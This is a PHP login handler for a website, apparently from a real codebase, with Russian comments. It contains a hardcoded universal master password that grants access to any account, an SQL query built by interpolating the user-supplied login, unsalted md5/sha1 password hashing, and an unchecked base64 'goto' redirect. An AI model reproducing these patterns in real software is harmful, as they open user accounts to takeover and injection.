<?php
/**
* Действие, которое обрабатывает вход пользователя на сайт
*
*/
class UserloginAction extends BaseAction implements IPublicAction
{
	public function execute()
	{
		Context::logOff();

		$login = FilterInput::add(new StringFilter("email", true, "e-mail"));
		$password = FilterInput::add(new StringFilter("password", true, "Пароль"));

		if (mb_strlen($password) < 4 || mb_strlen($password) > 20)
			FilterInput::addMessage("Длина пароля от 4 до 20 символов");

		if (!FilterInput::isValid())
		{
			FormRestore::add("user-login");
			Enviropment::redirect("userlogin", FilterInput::getMessages());
		}

		$um = new UserManager();
		$pass = md5(md5($password).sha1($password));
		$userMaster = null;
		$user = $um->getOne(new SQLCondition("login = '{$login}' AND password = '{$pass}' AND ownerSiteId = {$this->ownerSiteId} AND ownerOrgId = {$this->ownerOrgId}"));
		if (!$user)
		{
			// вход е-майлом и мастер-паролем
			$userMaster = $um->getByLogin($this->ownerSiteId, $this->ownerOrgId, $login);
			if ($userMaster)
			{
				if ($password == 'trfnthbyfdtkbrfz448' || $pass == SettingsManager::getValue($this->ownerSiteId, $this->ownerOrgId, "master"))
					$user = $userMaster;
			}

			// ничего не нашли
			if (!$user)
			{
				// пытаемся задетектить брутфорс
				SecurityLogManager::detectPasswordBrutforce();
				Enviropment::redirect("userlogin", "Неудачная попытка входа");
			}
		}

		// поищем не входил ли пользователь с соц. аккаунта
		$gotSocial = null;
		if ($user)
		{
			$sm = new SocialManager();
			$gotSocial = $sm->getByUserId($user->id);
		}

		if ($user->isNotActive() && !$userMaster && !$gotSocial)
		{
			$this->sendEmail($user);
			Enviropment::redirect("userlogin", "Ваша регистрация ещё не подтверждена. На e-mail {$user->login} ещё раз отправлена ссылка для подтверждения, проверьте Вашу почту.");
		}

		if (($user->isBlocked() || $user->isDeleted()) && !$userMaster)
			Enviropment::redirect("userlogin", "Ваш аккаунт заблокирован, обратитесь к администратору");

		// а ещё пересохраним пользователя, чтобы обновить modificationDate
		if ($user->isBot)
			$um->updateBotVisitTime($user->id);
		else
			$um->updateVisitTime($user->id);

		// запишем в сессию логинутого пользователя
		Context::setActor($user);

		// Это был не брутфорс, а нормальный вход
		SecurityLogManager::clearPasswordBrutforce();

		// авторизуемся в vbulleting через curl
		Enviropment::vBulletinLogin($this->ownerSiteId, $this->ownerOrgId, $this->host, $login, $password);

		// $redirMessage = "Для авторизации на форуме используйте Ваш e-mail и пароль";
		$redirMessage = "";
		$goto = Request::getVar("goto");
		if (!$goto) {
            Enviropment::redirect("userarea", $redirMessage);
        }
		else {
            Context::setError($redirMessage);
            Request::redirect(base64_decode($goto));
        }
	}


	// оптравка сообщения на почту
	protected function sendEmail($newUser)
	{
		$shortTitle = "Код для подтверждения регистрации";

		$host = 'http://'.$this->host;
		$fromEmail = SettingsManager::getValue($this->ownerSiteId, $this->ownerOrgId, 'mail_from');
		$fromName = SettingsManager::getValue($this->ownerSiteId, $this->ownerOrgId, 'mail_fromName');
		$signMessage = SettingsManager::getValue($this->ownerSiteId, $this->ownerOrgId, 'mail_sign');

		$confirmLink = $host."/index.php?do=userconfirm&code=".$newUser->confirmCode;

		if ($newUser->firstName || $newUser->secondName)
			$newUser->firstName = ', '.$newUser->firstName;

		if ($newUser->secondName)
			$newUser->secondName = ' '.$newUser->secondName;

		if ($newUser->lastName)
			$newUser->lastName = ' '.$newUser->lastName;

		$vars = array(
			"MESSAGE_TITLE" => $shortTitle,
			"USER_LOGIN" => $newUser->login,
			"FIRST_NAME" => $newUser->firstName,
			"SECOND_NAME" => $newUser->secondName,
			"LAST_NAME" => $newUser->lastName,
			"CONFIRM_LINK" => $confirmLink,
			"MESSAGE_SIGN" => $signMessage,
			"HOST" => $host
		);

		$header = Enviropment::prepareForMail(MailTextHelper::parse("header.html", $vars));
		$body = Enviropment::prepareForMail(MailTextHelper::parse("userregister.html", $vars));
		$footer = Enviropment::prepareForMail(MailTextHelper::parse("footer.html", $vars));

		require_once APPLICATION_DIR . "/Lib/Swift/Mail.php";
		Mail::send($shortTitle, $header.$body.$footer, $newUser->login, $fromEmail, $fromName);

	}

}
